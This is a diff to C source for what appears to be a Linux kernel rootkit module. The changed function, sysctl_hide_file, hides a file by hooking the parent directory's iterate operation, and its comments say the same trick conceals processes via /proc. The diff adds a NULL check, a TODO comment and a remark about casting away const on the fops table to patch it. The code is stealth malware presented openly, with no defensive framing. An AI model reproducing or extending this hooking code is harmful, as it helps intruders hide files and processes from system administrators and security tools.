@@ -245,6 +245,12 @@ static int iterate_hook(struct file *file, struct dir_context *context)
 // attempts to ls the parent directory will not
 // display the file. Hiding a file under /proc can
 // also be used to hide the presence of a process.
+//
+// TODO: since there may be different file operations
+// for the parent (e.g. /proc), we should do this
+// based on path instead of parent dentry. Also, this
+// doesn't work correctly (or maybe it does, depending
+// on your intended result) on symlinks.
 static int sysctl_hide_file(const char *path)
 {
     int ret = -1;
@@ -263,9 +269,17 @@ static int sysctl_hide_file(const char *path)
         goto cleanup;
     }
 
-    // Retrieve file details
+    // Get parent dir entry
     file_dentry = f->f_path.dentry;
     parent_dentry = file_dentry->d_parent;
+    if (parent_dentry == NULL) {
+        log("Parent dentry is NULL\n");
+        goto cleanup;
+    }
+
+    // Get parent dir's fops table (cast off const, but
+    // note that #YOLO mode is required to actually
+    // write to it)
     fops = (struct file_operations *)fops_get(parent_dentry->d_inode->i_fop);
     if (fops->iterate_shared == NULL && fops->iterate == NULL) {
         log("Parent path is not iterable\n");
